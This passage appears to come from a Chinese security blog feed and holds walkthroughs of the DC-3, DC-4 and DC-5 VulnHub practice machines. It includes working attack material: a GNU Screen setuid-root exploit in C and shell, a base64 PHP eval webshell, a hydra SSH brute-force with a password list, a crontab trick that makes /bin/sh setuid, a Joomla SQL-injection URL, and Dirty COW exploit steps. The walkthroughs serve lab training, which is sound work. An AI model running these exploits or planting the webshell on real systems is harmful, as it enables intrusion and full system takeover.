class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure><p>rootshell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>run.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure><p>成功提权后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-5/12.png" alt="img"></p><p>获得flag，DC-5clear</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4</title>
      <link href="/2022/04/17/DC-4/"/>
      <url>/2022/04/17/DC-4/</url>
      
        <content type="html"><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/1.png" alt="img"></p><p>发现目标主机为192.168.168.131</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.131</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/2.png" alt="img"></p><p>开放了80端口和22端口，浏览器打开</p><p><img src="/2022/04/17/DC-4/cover.png" alt="img"></p><h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>用dirsearch看看目录情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/3.png" alt="img"></p><p>有个command.php，应该是远程命令执行了</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>显示用burp进行爆破</p><p><img src="/2022/04/17/DC-4/4.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：admin</span><br><span class="line">密码：happy</span><br></pre></td></tr></table></figure><p>登录进去</p><p><img src="/2022/04/17/DC-4/5.png" alt="img"></p><p>确实是命令执行<br>抓包<br>修改上传参数<br>上一个base64木马上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg== &quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2022/04/17/DC-4/6.png" alt="img"></p><p>蚁剑连接</p><p><img src="/2022/04/17/DC-4/7.png" alt="img"></p><p>查看&#x2F;home下有什么内容<br>在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak下找到了旧密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用hydra进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P ./dc4.txt  ssh://192.168.168.131</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/8.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：jim</span><br><span class="line">密码：jibril04</span><br></pre></td></tr></table></figure><p>用xshll或是kali连接到目标主机<br>看看身份</p><p><img src="/2022/04/17/DC-4/9.png" alt="img"></p><p>通过上传漏洞探测器，发现没有可用的提权漏洞<br>发现之前存在的一条信息</p><p><img src="/2022/04/17/DC-4/10.png" alt="img"></p><p>我有一条信息<br>去看看吧</p><p><img src="/2022/04/17/DC-4/11.png" alt="img"></p><p>这样就知道了charles的密码了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：charles</span><br><span class="line">密码： ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>登录charles的号看看<br>看了charles可以用sudo了</p><p><img src="/2022/04/17/DC-4/12.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>teehee是一个小的编辑器<br>这里我通过crontab提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo teehee /etc/crontab</span><br><span class="line">* * * * * root <span class="built_in">chmod</span> 4777 /bin/sh  //4777普通用户也能执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/14.png" alt="img"></p><p>分钟 小时 日期 月 周 用户 命令<br>ctrl+c退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cat</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/13.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2022/04/16/DC-3/"/>
      <url>/2022/04/16/DC-3/</url>
      
        <content type="html"><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/1.png" alt="img"></p><p>发现目标主机为192.168.168.130</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/2.png" alt="img"></p><p>开放了80端口，浏览器打开</p><p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p><h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p><p><img src="/2022/04/16/DC-3/3.png" alt="img"></p><p>是joomia<br>用dirsearch看看目录情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/4.png" alt="img"></p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p><p><img src="/2022/04/16/DC-3/5.png" alt="img"></p><p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/6.png" alt="img"></p><p>确实是存在报错注入<br>上msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/7.png" alt="img"></p><p>成功连上了</p><p><img src="/2022/04/16/DC-3/8.png" alt="img"></p><p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p><p><img src="/2022/04/16/DC-3/9.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/10.png" alt="img"></p><p>上传权限漏洞探测脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给脚本加执行权限然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure><p>发现脏牛</p><p><img src="/2022/04/16/DC-3/11.png" alt="img"></p><p>在www目录下下载脏牛提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/12.png" alt="img"></p><p>OK！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/16/DC-3/13.png" alt="img"></p><p>DC3 completed</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
